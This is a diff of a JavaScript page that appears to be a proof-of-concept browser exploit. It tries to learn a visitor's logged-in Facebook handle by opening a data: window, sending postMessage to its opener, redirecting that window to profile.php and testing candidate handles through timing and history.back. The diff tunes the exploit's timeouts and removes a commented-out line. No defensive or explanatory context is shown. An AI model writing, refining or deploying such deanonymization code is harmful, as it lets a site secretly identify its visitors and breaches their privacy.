@@ -15,7 +15,7 @@ window.onmessage=function(e){
   }
 }
 https = confirm('Do you have "https" in your profile URL? Cancel = NO, OK = YES')
-timeout = parseInt(prompt('Timeout for your network? For example 5000 - 5 seconds'));
+timeout = parseInt(prompt('Timeout for your network? Recommended 9000 - 9 seconds'));
 
 if(https){
   base='https://www.facebook.com'
@@ -45,12 +45,11 @@ try_next = function(){
       alert('Yes you are '+handle)
     }, 300);
     x.history.back()
-  },100)
+  },500)
 }
-//opener.postMessage("","*")
 x=window.open('data:text/html,<script>opener.postMessage("","*")<'+'/script>'); 
 setTimeout(function(){
   x.location=(base+'/profile.php')
   setTimeout(try_next,timeout)
-},100)
+},500)
 </script></body></html>
